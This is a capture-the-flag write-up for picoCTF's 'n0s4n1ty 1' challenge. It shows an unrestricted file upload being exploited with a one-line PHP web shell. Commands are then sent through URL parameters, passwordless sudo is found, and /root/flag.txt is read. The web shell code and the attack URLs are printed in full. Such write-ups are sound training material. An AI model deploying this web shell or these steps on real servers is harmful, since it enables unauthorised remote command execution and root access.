# PICOCTF : n0s4n1ty 1

1. Launch instance. Then open the given link.
2. We are provided with a submission page. The clue lies in unsanitized valid file extension.
3. We can test the waters by submitting a normal `jpeg` file. 
4. After hitting the upload button, we are led to the `/upload.php`, telling us that the uploaded file is in the `/upload` directory.
5. Let's see if we can get a reverse shell.
6. I submitted another file named `php-reverse-shell.php` from saved kali linux php shell, and set the ips and listener.
7. It got uploaded despite the `php` file extension!
8. It loaded on the site, but didnt reflect anything to my listener.
9. I then opted for another php file, that is for webshells.
```
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```
10. I copied the path including the `cmd` to be able to ran some terminal commands: `http://standard-pizzas.picoctf.net:64588/uploads/webshell.php?cmd=whoami`
11. We can use [cyberchef](https://cyberchef.org/) for URL encoding of commands.
12. It responds as `www-data`. Now we need to escalate privileges to get the flag in the `/root` directory.
13. We can first check the sudo privileges: `http://standard-pizzas.picoctf.net:64588/uploads/webshell.php?cmd=sudo%20-l`.
```
Matching Defaults entries for www-data on challenge:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on challenge:
    (ALL) NOPASSWD: ALL 
```
14. This is great, we can access everything without any password!
15. Let's now find a way to get the flag in the `/root` directory: `http://standard-pizzas.picoctf.net:64588/uploads/webshell.php?cmd=sudo%20ls%20-la%20/root`
```
total 12 drwx------ 1 root root 22 Mar 6 03:56 .
drwxr-xr-x 1 root root 39 Aug 17 16:16 ..
-rw-r--r-- 1 root root 571 Apr 10 2021 .bashrc
-rw-r--r-- 1 root root 161 Jul 9 2019 .profile
-rw-r--r-- 1 root root 36 Mar 6 03:56 flag.txt 
```
16. We got the `flag.txt`! Now let's retrieve it: `http://standard-pizzas.picoctf.net:64588/uploads/webshell.php?cmd=sudo%20cat%20/root/flag.txt`
17. Retrieve your picoCTF flag!

